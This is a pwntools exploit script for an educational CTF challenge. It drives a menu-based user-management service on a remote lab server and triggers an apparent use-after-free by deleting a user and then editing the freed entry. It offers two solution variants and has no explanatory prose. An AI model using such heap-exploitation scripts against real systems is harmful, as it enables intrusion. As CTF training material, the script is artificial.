from pwn import *

r = remote("edu-ctf.zoolab.org", 10008)

def add_user(idx: int, name: bytes, password: bytes):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", str(idx).encode("ascii"))
    r.sendafter(b"> ", name)
    r.sendafter(b"> ", password)

def edit_data(idx: int, size: int, data: bytes):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", str(idx).encode("ascii"))
    r.sendlineafter(b"> ", str(size).encode("ascii"))
    r.send(data)

def del_user(idx: int):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"> ", str(idx).encode("ascii"))

def show_users():
    r.sendlineafter(b"> ", b"4")

# Sol.1
# add_user(1, b"A"*0x10, b"B"*0x10)
# del_user(0)
# edit_data(1, 0x20, b"A"*0x10)

# Sol.2
del_user(0)
edit_data(0, 0x20, b"A"*0x10)

show_users()

r.interactive()